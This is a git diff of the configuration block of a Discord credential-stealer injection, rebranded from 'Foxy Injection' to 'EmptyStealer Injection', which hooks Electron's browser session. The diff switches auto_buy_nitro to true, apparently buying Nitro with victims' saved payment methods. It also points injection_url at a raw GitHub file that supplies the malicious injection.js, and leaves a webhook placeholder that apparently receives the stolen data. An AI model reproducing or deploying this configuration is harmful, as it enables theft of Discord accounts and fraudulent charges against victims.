@@ -8,13 +8,12 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
-  auto_buy_nitro: false,
+  auto_buy_nitro: true,
   ping_on_run: true,
   ping_val: '@here',
-  embed_name: 'Foxy Injection',
-  embed_icon: 'https://cdn.discordapp.com/attachments/1040380029005205605/1052894433118523402/Rocket.png'.replace(/ /g, '%20'),
+  embed_name: 'EmptyStealer Injection',
   embed_color: 5639644,
-  injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js',
+  injection_url: 'https://raw.githubusercontent.com/Void-666/Injection/main/injection.js',
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
